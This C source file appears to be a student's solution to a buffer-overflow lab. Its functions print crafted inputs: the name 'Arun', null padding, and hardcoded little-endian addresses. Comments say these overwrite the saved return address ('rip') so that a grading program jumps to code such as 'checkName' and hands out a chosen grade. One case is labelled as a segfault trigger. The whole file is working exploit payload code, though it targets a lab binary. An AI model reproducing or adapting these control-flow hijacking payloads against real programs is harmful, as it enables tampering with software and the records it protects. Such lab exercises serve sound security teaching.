#include <stdio.h>
#include <malloc.h>
#include <string.h>

char * inp;

// Seg Fault Case
void fnCaseE()
{
	char* inp = malloc(sizeof(char) * 68);
	char* name = "Arun";
	strcpy(inp,name);
	int i;
	for(i = 4; i < 63; ++i)
	{
		inp[i] = '\0';
	}
	inp[64] = (char) 0x00;
	inp[65] = (char) 0x00;
	inp[66] = (char) 0x00;
	inp[67] = (char) 0x00;
	//inp[65] = (char) 0x07;
	//fwrte(inp,1,66,stdout);//stdout,inp,66);
	write(1,inp,68);
	fflush(stdout);
	//inp[69] = '\0';
}
void fnCaseD(){

	char* inp = malloc(sizeof(char) * 68);
	char* name = "Arun";
	strcpy(inp,name);
	int i;
	for(i = 4; i < 63; ++i)
	{
		inp[i] = '\0';
	}
	inp[64] = (char) 0x00;
	inp[65] = (char) 0x07;
	inp[66] = (char) 0x40;
	inp[67] = (char) 0x00;
	//inp[65] = (char) 0x07;
	write(1,inp,68);
	fflush(stdout);
	//inp[69] = '\0';

}
void fnCaseC(){

	char* inp = malloc(sizeof(char) * 108);
	strcpy(inp,"Arun");
	int i;
	for(i = 50; i < 108; ++i)
	{
		inp[i] = '\0';
	}
	//Over writing the rip to return to grade = 'C'
	inp[104] = (char) 0x2e;
	inp[105] = (char) 0x08;
	inp[106] = (char) 0x40;
	inp[107] = (char) 0x00;
	// Writing the address of checkName
	inp[64] = (char) 0x69;
	inp[65] = (char) 0x08;
	inp[66] = (char) 0x40;
	inp[67] = (char) 0x00;
	//inp[65] = (char) 0x07;
	write(1,inp,108);
	fflush(stdout);
	//inp[69] = '\0';

}

void fnCaseS(){

	char* inp = malloc(sizeof(char) * 108);
	strcpy(inp,"Arun");
	int i;
	for(i = 50; i < 108; ++i)
	{
		inp[i] = '\0';
	}
	//Over writing the rip to return to grade = 'C'
	inp[104] = (char) 0x86;
	inp[105] = (char) 0x29;
	inp[106] = (char) 0x40;
	inp[107] = (char) 0x00;
	// Writing the address of checkName
	inp[64] = (char) 0x40;
	inp[65] = (char) 0x18;
	inp[66] = (char) 0x40;
	inp[67] = (char) 0x00;
	//inp[65] = (char) 0x07;
	write(1,inp,108);
	fflush(stdout);
	//inp[69] = '\0';

}

int main(int argc, char**argv)
{
	switch(argv[1][0])
	{
		case 'd': fnCaseD();
			 break;
		case 'e': fnCaseE();
			 break;
		case 'c': fnCaseC();
			 break;
		case 's': fnCaseS();
			 break;
		default: printf("Arun");
			break;
	}
	return 0;
}
